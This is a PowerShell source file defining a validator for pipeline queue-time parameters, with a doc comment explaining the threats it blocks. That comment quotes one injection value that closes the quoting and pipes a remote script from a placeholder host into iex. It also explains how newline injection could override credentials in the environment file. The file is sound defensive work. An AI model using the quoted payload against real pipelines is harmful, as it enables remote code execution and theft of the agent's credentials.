<#
    Queue-time parameter handling for the pipeline definitions.

    Function definitions only, so this file can be dot-sourced by the pipeline scripts
    and by the test suite alike. It exists at all because the logic below used to live
    inline in all three YAML files: an injection control, triplicated, in the one part of
    the repository that the parse check, PSScriptAnalyzer and Pester all skip. A bypass
    found in it had to be fixed in three places, and nothing checked that the three
    copies still agreed.
#>

Set-StrictMode -Version Latest
$ErrorActionPreference = 'Stop'

function Assert-ParameterValue {
    <#
    .SYNOPSIS
        Validates one queue-time parameter before it reaches a file or a command line.

    .DESCRIPTION
        Two separate protections, and the second is the one that is easy to drop.

        A queue-time parameter reaches the pipeline script as an environment variable,
        never as a template expression inside a script body: a template expression is
        expanded at compile time, so a free-text parameter is pasted in as SOURCE CODE.
        A value of

            x'; iwr http://host/payload.ps1 | iex; '

        closed the quoting and ran on the agent, in a job holding ADO_PAT and the
        connection credentials.

        Reading the value as data closes that, and this function closes the rest: even
        as data, a value carrying a line break would append arbitrary KEY=VALUE lines to
        the environment file - enough to override ADO_PAT or introduce a credential of
        the attacker's choosing. The pattern check then constrains what remains to the
        shape the parameter is supposed to have.

    .PARAMETER Name
        Parameter name, used in the error so a failure names what to fix.

    .PARAMETER Value
        The value as it arrived, before trimming.

    .PARAMETER Required
        Fail rather than return empty when the value is absent.

    .PARAMETER Pattern
        Regular expression the trimmed value must match. Anchor it: an unanchored
        pattern accepts anything with a valid substring somewhere in it.

    .EXAMPLE
        Assert-ParameterValue -Name 'project' -Value $env:PARAM_PROJECT -Required -Pattern '^[A-Za-z0-9][A-Za-z0-9 ._-]*$'

        Returns the trimmed project name, or throws.

    .OUTPUTS
        The trimmed value, or an empty string when it is absent and not required.
    #>
    [CmdletBinding()]
    [OutputType([string])]
    param(
        [Parameter(Mandatory)] [string] $Name,
        [AllowEmptyString()] [AllowNull()] [string] $Value,
        [switch] $Required,
        [string] $Pattern
    )

    if ([string]::IsNullOrWhiteSpace($Value)) {
        if ($Required) { throw "Parameter '$Name' is required and arrived empty." }
        return ''
    }

    # Character codes rather than an escape sequence. This check used to live in a YAML
    # block scalar, where a backslash escape in that position is easy to mangle, and the
    # habit is worth keeping: the codes cannot be misread.
    if ($Value.IndexOfAny([char[]]@([char]13, [char]10)) -ge 0) {
        throw "Parameter '$Name' contains a line break, which would inject extra variables into the environment file."
    }

    $trimmed = $Value.Trim()
    if ($Pattern -and $trimmed -notmatch $Pattern) {
        throw "Parameter '$Name' has value '$trimmed', which does not match the expected form $Pattern."
    }
    return $trimmed
}
